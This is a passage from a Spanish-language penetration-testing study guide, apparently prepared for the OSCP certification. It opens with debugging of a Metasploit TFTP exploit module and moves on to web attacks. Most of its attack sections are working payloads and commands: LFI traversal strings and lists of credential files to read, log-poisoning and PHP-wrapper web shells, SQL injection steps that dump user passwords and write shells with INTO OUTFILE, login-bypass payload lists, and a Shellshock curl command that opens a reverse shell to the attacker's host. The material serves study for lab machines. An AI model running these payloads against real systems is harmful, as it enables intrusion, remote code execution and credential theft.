[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> depth
=> 10
[4] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> levels
=> "../../../../../../../../../../"
[5] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
```

Como vemos, el valor de la variable **levels** es (**../../../../../../../../../../**), lo que hace que nos planteemos que no se estÃ¡ almacenando correctamente el valor de nuestro **DEPTH**. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente lÃ­nea del programa:

```bash
92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
```

Donde como vemos, se especifica claramente que en caso de que el valor de **DEPTH** valga 0, esta se igualarÃ¡ a 10. Por lo que, deberÃ­amos cambiar la declaraciÃ³n a lo siguiente:

```bash
92:   depth  = datastore['DEPTH']
```

Una vez hecho, podremos ver como los valores de **DEPTH** y de **levels** son declarados correctamente:

```bash
msf exploit(windows/tftp/exploit_tftp) > show options

Module options (exploit/windows/tftp/exploit_tftp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows


msf exploit(windows/tftp/exploit_tftp) > set DEPTH 0
DEPTH => 0
msf exploit(windows/tftp/exploit_tftp) > set RHOST 192.168.1.42
RHOST => 192.168.1.42
msf exploit(windows/tftp/exploit_tftp) > run

[*] Started reverse TCP handler on 192.168.1.51:4444 
Found plugin pry-byebug, but could not require 'pry-byebug'
cannot load such file -- pry-byebug

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
 =>  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = datastore['DEPTH']
     93:   levels = "../" * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status("#{peer} - Uploading .mof...")
    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    105: end

[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> break 96

  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 

      93:     levels = "../" * depth
    94: 
    95:     # Upload the malicious executable to C:\Windows\System32\
 => 96:     print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
    97:     upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
    98: 
    99:     # Let the TFTP server idle a bit before sending another file


[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> c

  Breakpoint 1. First hit

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = datastore['DEPTH']
     93:   levels = "../" * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
 =>  96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status("#{peer} - Uploading .mof...")
    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    105: end

[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> depth
=> 0
[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> levels
=> ""
[4] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> 
```

Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya queda claro la funcionalidad del **pry-byebug**.

**2. Burpsuite**

Otra opciÃ³n para los menos valientes (aunque a veces tambiÃ©n la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pestaÃ±a de Proxies (**Options**), aÃ±adimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pestaÃ±a **Request Handling**, debe redireccionar al Host vÃ­ctima asÃ­ como al puerto real donde se encuentre el servicio configurado que queremos analizar.

Lo que conseguimos con esto, es que de visualizar el recurso **http://localhost:4646**, nos cargue el mismo contenido que el del servicio web del Host vÃ­ctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) asÃ­ como el puerto 4646 para que todo el trÃ¡fico sea interceptado desde Burpsuite y posteriormente redireccionado al Host vÃ­ctima. Esto nos permite analizar por ejemplo desde el **Repeater** cÃ³mo es la respuesta del lado del servidor una vez se envÃ­a el exploit al Host vÃ­ctima.

### Pentesting Web

#### LFI

Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un **Directory Path Transversal**.

A modo de ejemplo, presento a continuaciÃ³n un script en PHP con dicha vulnerabilidad:

```php
<?php
    $file = $_REQUEST['file'];
    echo include($file);
?>
```

Suponiendo que el fichero se llama _file.php_, si desde la URL efectuamos la siguiente bÃºsqueda:

`http://localhost/file.php?file=/etc/passwd`

Veremos cÃ³mo se nos lista el fichero passwd del equipo Linux local. HabrÃ¡n ocasiones en las que tengamos que recorrer un par de directorios hacia atrÃ¡s para visualizar el recurso:

`http://localhost/file.php?file=../../../../../etc/passwd`

AsÃ­ como incorporar un **%00** para el bypassing de restricciones implementadas:

`http://localhost/file.php?file=../../../../../etc/passwd%00`

Otra forma tambiÃ©n de bypassear posibles restricciones es aÃ±adiendo un interrogante al final de la peticiÃ³n:

`http://localhost/file.php?file=../../../../../etc/passwd?`

Por [aquÃ­](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras tÃ©cnicas de bypassing.

Otra consideraciÃ³n a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensiÃ³n **.php** estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:

`http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php`

La idea para no ver **PD9waHAKCSNQcnVlYmEKPz4K1** desde la web, es aplicar el siguiente comando desde terminal:

```bash
$~ curl --silent http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php | base64 -d 2>/dev/null

<?php
	#Prueba
?>
```

Donde como vemos, se consigue visualizar el recurso PHP.

Recursos interesantes siempre a mirar son los siguientes:

```bash
/etc/issue 
/etc/motd 
/etc/passwd 
/etc/group 
/etc/resolv.conf
/etc/shadow
/home/[USERNAME]/.bash_history o .profile
~/.bash_history o .profile
$USER/.bash_history o .profile
/root/.bash_history o .profile
/etc/mtab  
/etc/inetd.conf  
/var/log/dmessage
.htaccess
config.php
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/apache/error.log
/var/log/apache/access.log
/var/log/httpd/error_log
/var/log/access_log
/var/log/mail
/var/log/sshd.log
/var/log/vsftpd.log
.bash_history
.mysql_history
.my.cnf
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

AsÃ­ como los siguientes en mÃ¡quinas Windows:

```bash
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini
c:\Program Files\Apache Group\Apache\logs\access.log  
c:\Program Files\Apache Group\Apache\logs\error.log
c:\WINDOWS\TEMP\  
c:\php\sessions\  
c:\php5\sessions\  
c:\php4\sessions\
windows\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

#### LFI Code Examples

A continuaciÃ³n, se detallan algunas vulnerabilidades de tipo **LFI** con el cÃ³digo del lado del servidor, para poder practicar en local dichas tÃ©cnicas.

**Basic Includes**

CÃ³digo del servidor:

```php
<?php
$file = $_GET['file'];

if(isset($file))
{
  include("$file");
}
```

PeticiÃ³n legÃ­tima:

```bash
http://localhost/index.php?file=contact.php
```

PeticiÃ³n malintencionada:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #curl --silent http://localhost/index.php?file=/etc/subgid
s4vitar:100000:65536
```

**Directory traversal attack**

CÃ³digo del servidor:

```php
<?php
$file = $_GET['file'];
if(isset($file))
{
  include("lib/functions/$file");
}
```

PeticiÃ³n legÃ­tima:

```bash
http://localhost/index.php?file=contact.php
```

PeticiÃ³n malintencionada:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #curl --silent http://localhost/index.php?file=../../../../../etc/subgid
s4vitar:100000:65536
```

**Null Byte Injection**

CÃ³digo del servidor:

```php
<?php
$file = $_GET['file'];
if(isset($file))
{
  include("lib/functions/$file.php");
}
```

PeticiÃ³n legÃ­tima:

```bash
http://localhost/index.php?file=contact
```

PeticiÃ³n malintencionada:

```bash
curl --silent "http://localhost/index.php?file=../../../../../../../../../etc/subgid%00"
s4vitar:100000:65536
```

Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la versiÃ³n **5.3.4**.

**Filter Evasion**

CÃ³digo del servidor:

```php
<?php
$file = str_replace('../', '', $_GET['file']);
if(isset($file))
{
  include("lib/functions/$file");
}
```

PeticiÃ³n malintencionada:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #curl --silent "http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid"
s4vitar:100000:65536
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #curl --silent "http://localhost/index.php?file=....//....//....//....//....//etc/subgid"
s4vitar:100000:65536
â”Œâ”€[root@parrot]â”€[/var/www/html]
```

**Double encoding**

Para continuar evitando filtro, se puede hacer uso de una doble codificaciÃ³n. Esto es, codificamos los datos por primera vez:

```bash
%2E%2E%2Fetc%2Fpasswd
```

Y ahora codificamos el **%**:

```bash
%252E%252E%252Fetc%252Fpasswd
```

**Path Truncation**

Sobre la solicitud en la que pretendemos hacer **LFI**, aÃ±adimos mil veces **./** para el recurso **../../../../etc/passwd/././././././<...>/.php**. Una vez el nombre del archivo cuenta con mÃ¡s de 4.096 bytes, se elimina la parte mÃ¡s larga. De esta forma, nuestra peticiÃ³n se convierte en **../../../../etc/passwd**.

#### RFI

Esta vulnerabilidad tiene cierta similitud que el LFI, sÃ³lo que la inclusiÃ³n de archivos se produce de manera remota, permitiÃ©ndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.

Un buen ejemplo para practicar es la mÃ¡quina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizÃ¡bamos la siguiente consulta desde la URL:

`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
path=http://nuestraIP/wp-load.php`

De esta forma, resulta sencillo pensar en lo fÃ¡cil que puede llegar a ser para el caso descrito el acceso al sistema.

#### LFI to RCE

Existen varias formas de conseguir ejecutar comandos en remoto a travÃ©s de un **Local File Inclusion**, asÃ­ como de acceder al sistema a travÃ©s de la visualizaciÃ³n de ciertos recursos. Para este caso, explicarÃ© 2 tÃ©cnicas a modo de ejemplo:

* Log Poisoning (access.log & auth.log)
* Mail PHP Execution

La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.

En caso de serlo para la ruta _/var/log/auth.log_, podemos llevar a cabo tÃ©cnicas de autenticaciÃ³n que nos permitan obtener ejecuciÃ³n de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas ademÃ¡s de las normales de sesiÃ³n, las que van por SSH.

Esto en otras palabras se traduce en que por cada intento fallido de conexiÃ³n por SSH hacia el sistema, se generarÃ¡ un reporte visible en el recurso _/var/log/auth.log_. La idea en este punto es aprovechar la visualizaciÃ³n del recurso para forzar la autenticaciÃ³n de un usuario no convencional, donde incrustramos un cÃ³digo PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.

Ejemplo:

`ssh "<?php system('whoami'); ?>"@192.168.1.X`

Tras introducir una contraseÃ±a incorrecta para el usuario inexistente, se generarÃ¡ un reporte en el recurso _auth.log_ como el siguiente:

```bash
Nov  5 11:53:46 parrot sshd[13626]: Failed password for invalid user <?php echo system('whoami'); ?> from ::1 port 39988 ssh2
Nov  5 11:53:48 parrot sshd[13626]: Connection closed by invalid user <?php echo system('whoami'); ?> ::1 port 39988 [preauth]
```

Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cÃ³mo figurarÃ¡ un usuario '***www-data***' para el campo _whoami_ definido en el script php incrustrado a travÃ©s del usuario de autenticaciÃ³n.

Para el caso del recurso _access.log_ pasa algo similar, sÃ³lo que en cuanto a la implementaciÃ³n tÃ©cnica se realizarn otras operaciones.

Siempre suelo emplear Burpsuite como intermediario, pero tambiÃ©n se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la pÃ¡gina web cambiando el User-Agent por un cÃ³digo PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el cÃ³digo PHP es interpretado en el User-Agent de la peticiÃ³n en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedÃ­a con el recurso _auth.log_.

Otra de las tÃ©cnicas para conseguir la ejecuciÃ³n de comandos a travÃ©s de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodologÃ­a paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).

La segunda de ellas [**Mail PHP Execution**], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '**/etc/passwd**', poder visualizar sus correspondientes mails en '**/var/mail/usuario**'.

Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos "malformar" un mensaje para insertar cÃ³digo PHP y posteriormente apuntarlo desde el navegador.

En caso de no llegar a saber quÃ© usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:

```bash
smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X 
```

Obteniendo resultados similares al siguiente:

```bash
192.168.1.X: root exists
192.168.1.X: mysql exists
192.168.1.X: www-data exists
```

Ahora que sabemos que el usuario **www-data** existe, podemos hacer lo siguiente:

```bash
telnet 192.168.1.X 25

HELO localhost

MAIL FROM:<root>

RCPT TO:<www-data>

DATA

<?php

echo shell_exec($_REQUEST['cmd']);
?>
```

Â¿QuÃ© tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sÃ³lo tendremos que hacer lo siguiente:

```bash
http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar
```

Y el navegador nos devolverÃ¡ el output del comando aplicado a nivel de sistema.

#### LFI to RCE via PHP Sessions

Para este caso, comprobamos si el sitio web cuenta usa **PHP SESSION** (_PHPSESSID_):

```bash
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

En PHP, estas sesiones son almacenadas en la ruta '**/var/lib/php5/sess[PHPSESSID]**':

```bash
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

La idea es setear la Cookie a `<?php system('cat /etc/passwd');?>`:

```bash
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a travÃ©s del LFI:

```bash
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

#### LFI to RCE via Environ

Si por algÃºn casual podemos visualizar el recurso **/proc/self/environ**, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:

```bash
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

#### LFI RFI Using Wrappers

##### Wrapper php://filter

```bash
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Se puede jugar con otro wrapper de compresiÃ³n en caso de contar con un archivo muy grande:

```bash
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

AsÃ­ mismo, los wrappers tambiÃ©n pueden ser encadenados:

```bash
php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
```

##### Wrapper zip://

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

##### Wrapper data://

Este Wrapper nos permite ejecutar directamente cÃ³digo PHP:

```bash
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTA: El payload es "<?php system($_GET['cmd']);echo 'Tenemos Shell!'; ?>"
```

Otra forma:

```bash
http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
```

Otro payload interesante a tener en cuenta es el `<?php phpinfo(); die();?>`. La funcionalidad **die** previene la ejecuciÃ³n del resto del script o la ejecuciÃ³n de la extensiÃ³n decodificada incorrectamente anexada a la secuencia.

Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga Ãºtil puede ser:

```bash
http://example.com/index.php?file=data:,<?system($_GET['x']);?>&x=ls
```

O tambiÃ©n:

```bash
http://example.com/index.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls.
```

##### Wrapper expect://

```bash
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

##### Wrapper input://

Especificamos nuestro payload a travÃ©s de un parÃ¡metro POST:

```bash
http://example.com/index.php?page=php://input
POST DATA: <? system('id'); ?>
```

TambiÃ©n puede hacerse desde terminal de la siguiente forma:

```bash
$~ echo "<? system('id'); ?>" | POST http://example.com/index.php?page=php://input
```

##### Wrapper phar://

Crea un archivo **phar** con un objeto serializado en sus metadatos:

```bash
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

Si llegados a este punto, cualquier operaciÃ³n es realizada en nuestro archivo Phar existente haciendo uso del wrapper **phar://**, entonces los metadatos serializados son deserializados y por tanto interpretados.

Si esta aplicaciÃ³n contase con una clase llamada **AnyClass** y tuviese los mÃ©todos mÃ¡gicos **__destruct()** o **__wakeup()** definidos, entonces estos serÃ­an invocados automÃ¡ticamente:

```bash
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

#### SQLI

Ejemplo bÃ¡sico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3

Comprobamos que la web es vulnerable a inyecciÃ³n SQL:

`http://www.paginaweb.com/contenidos.php?Id=-1 `

Enumeramos hasta coincidir con el nÃºmero de columnas para generar las etiquetas:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -`

Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, asÃ­ como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -`

Comenzamos a enumerar las tablas de la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -`

Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rÃ¡pida quÃ© tablas existen sobre la base de datos, parseando para ello los resultados en funciÃ³n del caso que se nos presente:

```bash
for i in $(seq 1 200); do
    echo -n "Para el nÃºmero $i: "
    curl --silent "http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
done
```

Obteniendo resultados como los siguientes:

```bash
Para el nÃºmero 63: CABECERA
Para el nÃºmero 64: COLABORADORES
Para el nÃºmero 65: CONTENIDOS
Para el nÃºmero 66: DOCUMENTOS
Para el nÃºmero 67: HORARIOS
Para el nÃºmero 68: IDIOMAS
Para el nÃºmero 69: IMAGENES
Para el nÃºmero 70: MODULOS
Para el nÃºmero 71: NOTICIAS
Para el nÃºmero 72: PERMISOS
Para el nÃºmero 73: USUARIOS
```

Una vez localizada la tabla que nos interese (para este caso, la tabla **usuarios**), enumeramos las columnas existentes para dicha tabla en la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -`

Es necesario para este paso convertir la cadena **usuarios** de STRING a formato ASCII. Obtendremos los siguientes resultados:

`IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR`

Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad _group_concat_ para concatenar todas las columnas cuyos datos queramos visualizar:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-`

Obteniendo el usuario y contraseÃ±a de acceso.

Antes de complicarse, preferible probar inyecciones bÃ¡sicas sobre paneles de autenticaciÃ³n, esto es:

```bash
Usuario: admin' or 1=1-- -
Password: admin' or 1=1-- -
```

Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vÃ­a es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticaciÃ³n como usuario vÃ¡lido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.

Para tÃ©cnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)

En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas **sql** se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicarÃ­amos la siguiente sintaxis a modo de ejemplo:

```bash
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

A continuaciÃ³n, un Payload de pruebas a realizar para los logins una vez hagamos la convencional **' or '1'='1**:

```bash
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

```

#### Shellshock

Buenas mÃ¡quinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la mÃ¡quina **Shocker** y la mÃ¡quina **Beep** de HackTheBox.

Esta es una vulnerabilidad que sÃ³lo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaraciÃ³n de funciones en variables, ejecutar comandos en remoto sobre sistemas a travÃ©s de consultas en este caso por medio de peticiones web.

Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una pÃ¡gina web. De existir, podemos buscar por archivos de extensiÃ³n '**.cgi**', aunque no es extrictamente necesario... pues tambiÃ©n podrÃ­a tratarse de un archivo de extensiÃ³n '**.sh**' y los efectos serÃ­an los mismos.

En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuaciÃ³n. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vÃ­a Netcat. En segundo lugar realizamos la siguiente peticiÃ³n desde terminal al servicio web:

```bash
$~ curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi" 
```

Si todo sale bien y es vulnerable a la explotaciÃ³n de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesiÃ³n de escucha.

**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirÃ¡ de una ligera enumeraciÃ³n manual o un simple modo alternativo de conexiÃ³n

Otra opciÃ³n es desde Burpsuite tambiÃ©n, manipulamos el User-Agent para que figure el siguiente contenido:

```bash
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1
```

#### Padding Oracle Attack

Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la mÃ¡quina **Padding Oracle** de _VulnHub_ y otra de ellas es la mÃ¡quina **Lazy** de _HackTheBox_. Ambas mÃ¡quinas se resuelven de la misma forma en cuanto a explotaciÃ³n de vulnerabilidad respecta, pudiendo tomar 2 vÃ­as de explotaciÃ³n.

La **primera vÃ­a de explotaciÃ³n** consiste en a travÃ©s del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario **admin** definamos un nuevo usuario **admin=**. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario **admin**. 

La **segunda vÃ­a de explotaciÃ³n** consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticaciÃ³n como dicho usuario, pillando la Cookie de sesiÃ³n desde la pestaÃ±a **Network** de la propia inspecciÃ³n de elemento o desde **Burpsuite**.

A continuaciÃ³n, utilizamos la herramienta **padbuster** para llevar a cabo el ataque de orÃ¡culo de relleno. Seguimos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0
```

